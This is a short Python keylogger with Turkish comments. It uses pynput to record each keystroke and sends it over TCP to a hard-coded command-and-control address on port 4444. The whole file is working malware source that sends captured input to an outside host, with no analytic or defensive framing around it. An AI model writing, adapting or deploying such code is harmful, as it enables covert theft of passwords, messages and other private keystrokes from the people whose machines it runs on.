from pynput import keyboard
import socket
import threading

# C2 Server'a bağlanılacak IP ve Port
SERVER_HOST = '192.168.0.109'  # Server'ın IP adresi
SERVER_PORT = 4444         # Server Portu

# Klavye tuşlarını dinleyecek ve anlık olarak server'a gönderecek
def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = f"[{key.name}]"

    # Server'a gönder
    send_to_server(key_data)

# Server'a bağlanma
def send_to_server(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_HOST, SERVER_PORT))
            s.send(data.encode())
    except Exception as e:
        print(f"Error sending key data: {e}")

# Klavye dinleyiciyi başlatma
def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Dinleyicinin çalışması
    listener.join()
